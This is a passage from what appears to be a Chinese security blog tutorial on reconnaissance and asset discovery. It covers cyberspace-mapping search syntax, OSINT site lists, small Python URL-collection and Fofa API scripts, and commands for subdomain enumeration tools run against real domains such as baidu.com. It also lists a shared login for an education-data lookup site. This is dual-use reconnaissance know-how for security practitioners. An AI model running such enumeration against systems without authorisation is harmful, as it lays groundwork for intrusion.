<p>钟馗之眼更偏向于Web应用层面的搜索</p>
<p>网址：<a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p>
<h3 id="搜索示例-2"><a href="#搜索示例-2" class="headerlink" title="搜索示例"></a>搜索示例</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app:nginx　　				组件名</span><br><span class="line"></span><br><span class="line">ver:1.0　　				版本</span><br><span class="line"></span><br><span class="line">os:windows　　			操作系统</span><br><span class="line"></span><br><span class="line">country:”China”　　		国家</span><br><span class="line"></span><br><span class="line">city:”hangzhou”　　		城市</span><br><span class="line"></span><br><span class="line">port:80　　				端口</span><br><span class="line"></span><br><span class="line">hostname:google　　		主机名</span><br><span class="line"></span><br><span class="line">site:thief.one　　		网站域名</span><br><span class="line"></span><br><span class="line">desc:nmask　　			描述</span><br><span class="line"></span><br><span class="line">keywords:nmask’blog　	关键词</span><br><span class="line"></span><br><span class="line">service:ftp　　			服务类型</span><br><span class="line"></span><br><span class="line">ip:8.8.8.8　　			ip地址</span><br><span class="line"></span><br><span class="line">cidr:8.8.8.8/24　　		ip地址段</span><br></pre></td></tr></table></figure>
<h3 id="Kunyu-坤舆"><a href="#Kunyu-坤舆" class="headerlink" title="Kunyu(坤舆)"></a>Kunyu(坤舆)</h3><p>Kunyu(坤舆)，是一款基于ZoomEye API开发的信息收集工具，旨在让企业资产收集更高效，使更多的安全从业者了解、使用网络空间资源测绘技术。</p>
<p>项目地址：<a href="https://github.com/knownsec/Kunyu">https://github.com/knownsec/Kunyu</a></p>
<h2 id="360-QUAKE"><a href="#360-QUAKE" class="headerlink" title="360 QUAKE"></a>360 QUAKE</h2><p>360 Quake 网络空间测绘系统是360网络安全响应中心（360-CERT）自主设计研发的全球网络空间测绘系统，能够对全球IPv4、IPv6地址进行持续性探测，实时感知全球网络空间中各类资产并发现其安全风险。</p>
<p>网址：<a href="https://quake.360.cn/quake/#/index">https://quake.360.cn/quake/#/index</a></p>
<p>搜索语法：<a href="https://quake.360.cn/quake/#/help?id=5eb238f110d2e850d5c6aec8&amp;title=%E6%A3%80%E7%B4%A2%E5%85%B3%E9%94%AE%E8%AF%8D">https://quake.360.cn/quake/#/help?id=5eb238f110d2e850d5c6aec8&amp;title=检索关键词</a></p>
<h3 id="QUAKE-API"><a href="#QUAKE-API" class="headerlink" title="QUAKE API"></a>QUAKE API</h3><p>使用go语言编写，基于命令行，支持QuakeAPI进行查询。</p>
<p>项目地址：<a href="https://github.com/YetClass/QuakeAPI">https://github.com/YetClass/QuakeAPI</a></p>
<h2 id="其它搜索引擎"><a href="#其它搜索引擎" class="headerlink" title="其它搜索引擎"></a>其它搜索引擎</h2><h3 id="S-R-P-智能自定义搜索"><a href="#S-R-P-智能自定义搜索" class="headerlink" title="S.R.P 智能自定义搜索"></a>S.R.P 智能自定义搜索</h3><p>OSINT-Labs 开源情报实验开发的搜索引擎，能综合各大搜索引擎进行智能搜索。</p>
<p>网址：<a href="https://www.osint-labs.org/search/s.php?q=&amp;sid=0">https://www.osint-labs.org/search/s.php?q=&amp;sid=0</a></p>
<h3 id="百度搜索引擎"><a href="#百度搜索引擎" class="headerlink" title="百度搜索引擎"></a>百度搜索引擎</h3><p>百度一下，你就知道。</p>
<p>网址：<a href="https://www.baidu.com">https://www.baidu.com</a></p>
<h3 id="搜狗搜索引擎"><a href="#搜狗搜索引擎" class="headerlink" title="搜狗搜索引擎"></a>搜狗搜索引擎</h3><p>支持微信公众号搜索、文章搜索、知乎搜索、英文搜索及翻译等。</p>
<p>网址：<a href="https://www.sogou.com">https://www.sogou.com</a></p>
<h3 id="360搜索引擎"><a href="#360搜索引擎" class="headerlink" title="360搜索引擎"></a>360搜索引擎</h3><p>360旗下搜索引擎。</p>
<p>网址：<a href="https://www.so.com">https://www.so.com</a></p>
<h3 id="雅虎搜索引擎"><a href="#雅虎搜索引擎" class="headerlink" title="雅虎搜索引擎"></a>雅虎搜索引擎</h3><p>雅虎公司旗下搜索引擎。</p>
<p>网址：<a href="https://www.yahoo.com">https://www.yahoo.com</a></p>
<h3 id="Yandex搜索引擎"><a href="#Yandex搜索引擎" class="headerlink" title="Yandex搜索引擎"></a>Yandex搜索引擎</h3><p>Yandex是俄罗斯最流行的搜索引擎，占俄罗斯国内市场的55%。</p>
<p>网址：<a href="https://yandex.com">https://yandex.com</a></p>
<h3 id="Exalead搜索引擎"><a href="#Exalead搜索引擎" class="headerlink" title="Exalead搜索引擎"></a>Exalead搜索引擎</h3><p>一款法国公司开发的搜索引擎。</p>
<p>网址：<a href="http://www.exalead.com/search/">http://www.exalead.com/search/</a></p>
<h3 id="Dogpile搜索引擎"><a href="#Dogpile搜索引擎" class="headerlink" title="Dogpile搜索引擎"></a>Dogpile搜索引擎</h3><p>Dogpile是一个聚合谷歌、雅虎、Yandex和其他流行的搜索引擎结果的元搜索引擎。</p>
<p>网址：<a href="https://www.dogpile.com">https://www.dogpile.com</a></p>
<h2 id="网盘在线搜索工具"><a href="#网盘在线搜索工具" class="headerlink" title="网盘在线搜索工具"></a>网盘在线搜索工具</h2><ul>
<li>凌风云：<a href="https://www.lingfengyun.com/">https://www.lingfengyun.com/</a></li>
<li>蓝菊花：<a href="http://www.lanjuhua.com/">http://www.lanjuhua.com/</a></li>
<li>大力盘：<a href="https://www.dalipan.com/">https://www.dalipan.com/</a></li>
<li>猪猪盘：<a href="http://www.zhuzhupan.com/">http://www.zhuzhupan.com/</a></li>
<li>PanSou：<a href="http://www.pansou.com/">http://www.pansou.com/</a></li>
<li>盘飞飞：<a href="https://panfeifei.com/">https://panfeifei.com/</a></li>
</ul>
<h2 id="其它情报信息查询"><a href="#其它情报信息查询" class="headerlink" title="其它情报信息查询"></a>其它情报信息查询</h2><ul>
<li>F12Sec教育信息查询系统：<a href="https://edudata.shikangsi.com/">https://edudata.shikangsi.com/</a> 【账号：2021】【 密码：2021】</li>
<li>验证邮件地址准确性工具：<a href="https://centralops.net/co/EmailDossier.aspx">https://centralops.net/co/EmailDossier.aspx</a></li>
<li>微步在线情报社区：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></li>
<li>IP地址归属查询工具：<a href="https://www.ip138.com/">https://www.ip138.com/</a></li>
<li>追寻各大网站历史工具：<a href="https://web.archive.org/">https://web.archive.org/</a></li>
<li>注册网站信息泄露查询工具：<a href="https://www.reg007.com/">https://www.reg007.com/</a></li>
<li>经纬度查询工具：<a href="https://map.yanue.net/">https://map.yanue.net/</a></li>
</ul>
<h2 id="信息收集工具编写"><a href="#信息收集工具编写" class="headerlink" title="信息收集工具编写"></a>信息收集工具编写</h2><h3 id="以传统搜索引擎进行URL采集"><a href="#以传统搜索引擎进行URL采集" class="headerlink" title="以传统搜索引擎进行URL采集"></a>以传统搜索引擎进行URL采集</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">domain = <span class="built_in">input</span>(<span class="string">&quot;请输入域名： &quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>):</span><br><span class="line">    i=i*<span class="number">10</span></span><br><span class="line">    <span class="comment">#header是用来规定我们到底模仿哪个浏览器去上网</span></span><br><span class="line">    heads=&#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0(Windows NT 6.1; Win64; x64; rv:56.0)</span></span><br><span class="line"><span class="string">    Gecko/20100101 Firefox/56.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#具体请求哪个页面</span></span><br><span class="line">    url=<span class="string">&#x27;https://cn.bing.com/search?q=site%3A&#x27;</span>+domain+<span class="string">&#x27;&amp;qs=n&amp;form=QBRE&amp;sp=-1&amp;pq=site%3Adgjy.net&amp;sc=2-11&amp;sk=&amp;cvid=C1A7FC61462345B1A71F431E60467C43&amp;toHttps=1&amp;redig=3FEC4F2BE86247E8AE3BB965A62CD454&amp;pn=2&amp;first=&#123;&#125;&amp;FROM=PERE&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    <span class="comment">#返回的内容</span></span><br><span class="line">    html=requests.get(url,headers=heads)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#筛选 初始化一下这个筛选工具</span></span><br><span class="line">    soup=BeautifulSoup(html.content,<span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#具体要把哪个地方的东西提出来 如果找到了h2 就把下面整个保存起来</span></span><br><span class="line">    job_bt=soup.findAll(<span class="string">&#x27;h2&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> job_bt:</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#获得h2找到的这个东西中间的a标签中的href属性里面的值</span></span><br><span class="line">    <span class="built_in">print</span>(i.a.get(<span class="string">&#x27;href&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>我个人编写的一个URL采集工具：</p>
<p><a href="https://github.com/UlyssesTakusen/CaiJiEngine">https://github.com/UlyssesTakusen/CaiJiEngine</a></p>
<h3 id="以空间测绘引擎API进行信息收集"><a href="#以空间测绘引擎API进行信息收集" class="headerlink" title="以空间测绘引擎API进行信息收集"></a>以空间测绘引擎API进行信息收集</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fofa</span>:</span></span><br><span class="line">    email = <span class="string">&quot;你的邮箱&quot;</span></span><br><span class="line">    key = <span class="string">&quot;你的API-Key&quot;</span></span><br><span class="line"></span><br><span class="line">    ips = []</span><br><span class="line">    domains = []</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getData</span>(<span class="params">self,arg</span>):</span></span><br><span class="line">        api = <span class="string">&quot;https://fofa.so/api/v1/search/all?email=&#123;&#125;&amp;key=&#123;&#125;&amp;qbase64=&#123;&#125;&quot;</span></span><br><span class="line">        flag = base64.b64encode(arg.encode()).decode()</span><br><span class="line">        response = requests.get(api.<span class="built_in">format</span>(self.email,self.key,flag))</span><br><span class="line">        self.results = response.json()[<span class="string">&quot;results&quot;</span>]</span><br><span class="line">        self.length = <span class="built_in">len</span>(self.results)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> result <span class="keyword">in</span> self.results:</span><br><span class="line">            self.domains.append(result[<span class="number">0</span>])</span><br><span class="line">            self.ips.append(result[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    arg = sys.argv[<span class="number">1</span>]</span><br><span class="line">    fofa = Fofa()</span><br><span class="line">    fofa.getData(arg)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;共搜索到&#123;&#125;条记录！&quot;</span>.<span class="built_in">format</span>(fofa.length))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fofa.results)):</span><br><span class="line">        <span class="built_in">print</span>(fofa.domains[i],<span class="string">&quot;\t&quot;</span>,fofa.ips[i])</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Web安全</category>
        <category>资产收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>子域名挖掘工具</title>
    <url>/post/fb6104a2.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Layer子域名挖掘机"><a href="#Layer子域名挖掘机" class="headerlink" title="Layer子域名挖掘机"></a>Layer子域名挖掘机</h2><p>Layer子域名挖掘机是一款域名查询工具，可提供网站子域名查询服务。拥有简洁的界面、简单的操作模式，支持服务接口、暴力搜索、同服挖掘三种模式，支持打开网站、复制域名、复制IP、复制CDN、导出域名、导出IP、导出域名+IP、导出域名+IP+WEB服务器以及导出存活网站！<img src="https://i.loli.net/2021/10/05/ufoXJeBp8cThPYR.png" alt="bf99b7e2c5e77cff30bd9e2f57d8e476.png"></p>
<p>用法就不用多解释了，图形化界面简单易上手，信息收集必备神器！</p>
<h2 id="Maltego"><a href="#Maltego" class="headerlink" title="Maltego"></a>Maltego</h2><p>Maltego是一款非常优秀的信息收集工具。与其他工具相比，不仅功能强大，而且自动化水平非常高，不需要复杂的命令，就能轻松的完成信息收集。</p>
<p><img src="https://i.loli.net/2021/10/05/3Wf6IjMU9GRYtEB.png" alt="39116d8f36bb288559e80364a25d1238.png"></p>
<p>账号注册与使用教程： <a href="https://blog.csdn.net/smli_ng/article/details/105943189">https://blog.csdn.net/smli_ng/article/details/105943189</a></p>
<p>maltego插件开发：<a href="https://www.freebuf.com/sectool/207378.html">https://www.freebuf.com/sectool/207378.html</a></p>
<h2 id="OneForAll"><a href="#OneForAll" class="headerlink" title="OneForAll"></a>OneForAll</h2><p>OneForAll是一款功能强大的子域收集工具</p>
<p>详细介绍：<a href="https://paper.seebug.org/1053/">https://paper.seebug.org/1053/</a></p>
<h3 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://gitee.com/shmilylty/OneForAll.git</span><br><span class="line"></span><br><span class="line">python3 -m pip install --user -U pip setuptools wheel -i https://mirrors.aliyun.com/pypi/simple/</span><br><span class="line"></span><br><span class="line">pip3 install --user -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> OneForAll</span><br><span class="line"></span><br><span class="line">python3 oneforall.py --<span class="built_in">help</span>            <span class="comment">#查看帮助菜单</span></span><br><span class="line"></span><br><span class="line">python3 oneforall.py --target example.com run</span><br></pre></td></tr></table></figure>
<h2 id="JSFinder"><a href="#JSFinder" class="headerlink" title="JSFinder"></a>JSFinder</h2><p>JSFinder是一款用作快速在网站的js文件中提取URL，子域名的工具。</p>
<p>详细介绍：<a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a></p>
<h3 id="下载使用"><a href="#下载使用" class="headerlink" title="下载使用"></a>下载使用</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Threezh1/JSFinder.git</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> JSFinder/</span><br><span class="line"></span><br><span class="line">python3 JSFinder.py -u http://www.baidu.com         <span class="comment">#简单爬取</span></span><br><span class="line"></span><br><span class="line">python3 JSFinder.py -u http://www.baidu.com -d       <span class="comment">#深度爬取</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#建议使用-ou 和 -os来指定保存URL和子域名的文件名。</span></span><br><span class="line">python3 JSFinder.py -u http://www.mi.com -d -ou mi_url.txt -os mi_subdomain.txt </span><br><span class="line"></span><br><span class="line">python3 JSFinder.py -f url.txt                         <span class="comment">#批量指定url</span></span><br><span class="line"></span><br><span class="line">python3 JSFinder.py -f js.txt -j                       <span class="comment">#批量指定js</span></span><br></pre></td></tr></table></figure>
<h2 id="subDomainsBrute"><a href="#subDomainsBrute" class="headerlink" title="subDomainsBrute"></a>subDomainsBrute</h2><p>高并发的DNS暴力枚举工具。</p>
<p>详细介绍：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></p>
<h3 id="下载安装-1"><a href="#下载安装-1" class="headerlink" title="下载安装"></a>下载安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/lijiejie/subDomainsBrute.git</span><br><span class="line"></span><br><span class="line">pip3 install aiodns</span><br></pre></td></tr></table></figure>
<h3 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> subDomainsBrute</span><br><span class="line"></span><br><span class="line">python3 subDomainsBrute.py -t 10 baidu.com -o baidu.txt</span><br></pre></td></tr></table></figure>
<h2 id="Sublist3r"><a href="#Sublist3r" class="headerlink" title="Sublist3r"></a>Sublist3r</h2><p>Sublist3rsublist3r是一款python开发的子域名枚举工具,通过各种搜索引擎 (例如Google,Yahoo,Bing,Baidu和Ask)枚举子域。Sublist3r还使用Netcraft，Virustotal，ThreatCrowd，DNSdumpster和ReverseDNS枚举子域。也集合了subbrute的暴力枚举功能。</p>
<h3 id="下载安装-2"><a href="#下载安装-2" class="headerlink" title="下载安装"></a>下载安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/aboul3la/Sublist3r.git</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> Sublist3r/</span><br><span class="line"></span><br><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure>
<h3 id="使用示例-1"><a href="#使用示例-1" class="headerlink" title="使用示例"></a>使用示例</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 sublist3r.py -d baidu.com		<span class="comment">#扫描子域名</span></span><br><span class="line"></span><br><span class="line">python3 sublist3r.py -b -d baidu.com	<span class="comment">#暴力枚举子域名</span></span><br></pre></td></tr></table></figure>
<h2 id="theHarvester"><a href="#theHarvester" class="headerlink" title="theHarvester"></a>theHarvester</h2><p>Kali Linux内置工具</p>
<p>theHarvester是一款信息收集工具，它可以从不同的公开源中(例如：搜索引擎和PGP key服务器)收集e -mail账户信息，用户名称和主机名/子域名等。theHarvester目的是帮助渗透测试人员在早期阶段尽可能的收集一些信息。这个工具十分简单但非常有效。</p>
<h3 id="常用选项"><a href="#常用选项" class="headerlink" title="常用选项"></a>常用选项</h3><ul>
<li>-l 限制并发搜索结果</li>
<li>-b 指定搜索引擎(google，pgp，bing，baidu等)</li>
<li>-d 指定搜索对象</li>
<li>-h 使用Shodan数据库去搜索主机</li>
</ul>
<h3 id="使用示例-2"><a href="#使用示例-2" class="headerlink" title="使用示例"></a>使用示例</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains theHarvester -d 163.com -l 500 -b google</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注：使用google作为搜索引擎需要使用proxychains代理进行“科学上网”</p>
</blockquote>
<h2 id="recon-ng"><a href="#recon-ng" class="headerlink" title="recon-ng"></a>recon-ng</h2><p>Kali Linux内置工具=</p>
<p>recon-ng是功能齐全的recon-ng框架，其目的是提供一个强大的环境，以快速，彻底地进行基于Web的开源侦查。recon-ng的使用方法和 Metasploit Framewor非常的相似。</p>
<blockquote>
<p>注：运行时需要使用proxychains代理进行“科学上网”</p>
</blockquote>
<h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><ul>
<li>back 返回上一级</li>
<li>dashboard 显示活动的总结</li>
<li>db 工作区的数据库页面</li>
<li>exit 退出recon-ng</li>
<li>help 帮助信息</li>
<li>index 创造一个模块</li>
<li>keys 管理第三方的api接口</li>
<li>marketplace 应用市场</li>
<li>modules 已经安装的模块</li>
<li>option 管理当前文本的选项</li>
<li>pdb 打开python进行调试</li>
<li>script 记录并执行命令脚本</li>
<li>shell 执行操作系统命令</li>
<li>show 显示各种框架的条目</li>
<li>snapshots 管理一个快照</li>
<li>spool 将结果输出到一个文件里</li>
</ul>
<h3 id="初始化安装模块"><a href="#初始化安装模块" class="headerlink" title="初始化安装模块"></a>初始化安装模块</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains recon-ng</span><br><span class="line"></span><br><span class="line">marketplace install all</span><br></pre></td></tr></table></figure>
<h3 id="模块子命令"><a href="#模块子命令" class="headerlink" title="模块子命令"></a>模块子命令</h3><ul>
<li>modules load 加载某个模块</li>
<li>modules reload 退出某个模块</li>
<li>modules search 搜索某个模块</li>
</ul>
<h3 id="示例-查询子域名"><a href="#示例-查询子域名" class="headerlink" title="示例-查询子域名"></a>示例-查询子域名</h3><p>1、搜索要用到的模块（recon-ng利用浏览器进行查询，也支持暴力破解）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">modules search bing（这里使用bing搜索引擎搜索，也支持其他浏览器）</span><br></pre></td></tr></table></figure>
<p>2、然后装载模块（进行子域名查询）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">modules load recon/domains-hosts/bing_domain_web</span><br></pre></td></tr></table></figure>
<p>3、查看我们需要配置的列表并进行配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">options list</span><br><span class="line"></span><br><span class="line">options set source baidu.com</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注：选项子命令</p>
<ul>
<li>options list 选项列表</li>
<li>options set 参数名称 参数值 （配置选项内容）</li>
<li>options unset 参数名称 （清除配置的内容）</li>
</ul>
</blockquote>
<p>4、然后运行模块，进行查询</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>
<p>5、查询结果保存在recon-ng的数据库的hosts表中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show hosts</span><br></pre></td></tr></table></figure>
<h3 id="示例-域名解析"><a href="#示例-域名解析" class="headerlink" title="示例-域名解析"></a>示例-域名解析</h3><p>1、我们要调用另一个模块并且查看选项列表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">modules load recon/hosts-hosts/resolve</span><br><span class="line"></span><br><span class="line">options list</span><br></pre></td></tr></table></figure>
<p>2、我们要查询hosts表中的子域名的IP地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">options set source query select host from hosts</span><br></pre></td></tr></table></figure>
<p>3、运行之后我们去hosts查看结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run</span><br><span class="line"></span><br><span class="line">show hosts</span><br></pre></td></tr></table></figure>
<h3 id="示例-生成报告"><a href="#示例-生成报告" class="headerlink" title="示例-生成报告"></a>示例-生成报告</h3><p>1、搜索要用到的模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">modules search report</span><br></pre></td></tr></table></figure>
<p>2、转载报告模块并查看列表选项</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">modules load reporting/html</span><br><span class="line"></span><br><span class="line">options list</span><br><span class="line"></span><br><span class="line">options set CREATOR plumeria</span><br><span class="line"></span><br><span class="line">options set CUSTOMER baidu</span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
<p>3、运行模块后就可以在生成的目录下查看文件</p>
<h2 id="SubFinder-KSubdomain-HttpX"><a href="#SubFinder-KSubdomain-HttpX" class="headerlink" title="SubFinder + KSubdomain + HttpX"></a>SubFinder + KSubdomain + HttpX</h2><ul>
<li><strong>SubFinder</strong>：用来查询域名的子域名信息的工具，可以使用很多国外安全网站的api接口进行自动化搜索子域名信息。<ul>
<li><a href="https://github.com/projectdiscovery/subfinder">https://github.com/projectdiscovery/subfinder</a></li>
</ul>
</li>
<li><strong>HttpX</strong>：一款运行速度极快的多功能HTTP安全工具，它可以使用retryablehttp库来运行多种网络探针，并使用了多线程机制来维持运行的稳定性和结果的准确性。<ul>
<li><a href="https://github.com/projectdiscovery/httpx">https://github.com/projectdiscovery/httpx</a></li>
</ul>
</li>
<li><strong>ksubdomain</strong>是一款基于无状态子域名爆破工具，支持在Windows/Linux/Mac上使用，它会很快的进行DNS爆破，在Mac和Windows上理论最大发包速度在30w/s,linux上为160w/s的速度。<ul>
<li><a href="https://github.com/knownsec/ksubdomain">https://github.com/knownsec/ksubdomain</a></li>
</ul>
</li>
</ul>
<h3 id="安装go环境"><a href="#安装go环境" class="headerlink" title="安装go环境"></a>安装go环境</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#下载go环境</span></span><br><span class="line">wget -c https://storage.googleapis.com/golang/go1.15.11.linux-amd64.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment">#解压到/usr/local/目录下</span></span><br><span class="line">tar -C /usr/<span class="built_in">local</span>/ -zxvf go1.15.11.linux-amd64.tar.gz   </span><br><span class="line"></span><br><span class="line"><span class="comment">#配置环境</span></span><br><span class="line">vim /etc/profile</span><br><span class="line"><span class="comment">#添加如下内容后保存：</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/<span class="built_in">local</span>/go/bin</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行以下命令，使环境变量立即生效</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看go版本</span></span><br><span class="line">go version</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置go开发中的环境变量</span></span><br><span class="line">go env -w GOPROXY=https://goproxy.io,direct</span><br><span class="line"></span><br><span class="line">go env -w GO111MODULE=on</span><br></pre></td></tr></table></figure>
<h3 id="下载编译SubFinder与httpx"><a href="#下载编译SubFinder与httpx" class="headerlink" title="下载编译SubFinder与httpx"></a>下载编译SubFinder与httpx</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装subfinder</span></span><br><span class="line">go get -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装httpx</span></span><br><span class="line">go get -v github.com/projectdiscovery/httpx/cmd/httpx                                 </span><br></pre></td></tr></table></figure>
<h3 id="下载编译KSubdomain"><a href="#下载编译KSubdomain" class="headerlink" title="下载编译KSubdomain"></a>下载编译KSubdomain</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt install libpcap-dev</span><br><span class="line"></span><br><span class="line">git clone https://github.com/knownsec/ksubdomain.git</span><br><span class="line"></span><br><span class="line">cd ksubdomain</span><br><span class="line"></span><br><span class="line">go mod download</span><br><span class="line"></span><br><span class="line">cd cmd</span><br><span class="line"></span><br><span class="line">go build ksubdomain.go</span><br><span class="line"></span><br><span class="line">mv ksubdomain /root/go/bin</span><br><span class="line"></span><br><span class="line">cd /root/go/bin</span><br></pre></td></tr></table></figure>
<h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#subfinder基本使用</span></span><br><span class="line">./subfinder -d baidu.com -o output.txt                                               </span><br><span class="line"></span><br><span class="line"><span class="comment">#ksubdomain基本使用</span></span><br><span class="line">./ksubdomain -d baidu.com</span><br><span class="line"></span><br><span class="line"><span class="comment">#管道操作</span></span><br><span class="line">./subfinder -d baidu.com -silent|./ksubdomain -verify -silent|./httpx -title -content-length -status-code</span><br><span class="line"><span class="comment">#可以用管道结合在一起配合工作。达到收集域名，验证域名，http验证存活目的。</span></span><br></pre></td></tr></table></figure>
<h2 id="在线工具查找子域名"><a href="#在线工具查找子域名" class="headerlink" title="在线工具查找子域名"></a>在线工具查找子域名</h2><p><a href="https://searchdns.netcraft.com/">https://searchdns.netcraft.com/</a></p>
<p><a href="https://pentest-tools.com/information-gathering/find-subdomains-of-domain">https://pentest-tools.com/information-gathering/find-subdomains-of-domain</a></p>
<p><a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a></p>
<p><a href="http://tool.chinaz.com/subdomain">http://tool.chinaz.com/subdomain</a></p>
<p><a href="https://spyse.com/tools/subdomain-finder">https://spyse.com/tools/subdomain-finder</a></p>
<p><a href="https://www.nmmapper.com/sys/tools/subdomainfinder/">https://www.nmmapper.com/sys/tools/subdomainfinder/</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>资产收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>域名&amp;IP收集方式</title>
    <url>/post/efd52af7.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="DNS解析"><a href="#DNS解析" class="headerlink" title="DNS解析"></a>DNS解析</h2><h3 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h3><p>nslookup命令用于查询DNS的记录,查看域名解析是否正常。</p>
<p>Windows和Kali Linux均内置</p>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nslookup baidu.com</span><br></pre></td></tr></table></figure>
<h3 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h3><p>Dig是一个在类Unix命令行模式下查询DNS包括NS记录,A记录,MX记录等相关信息的工具。</p>
<p>Kali Linux内置工具</p>
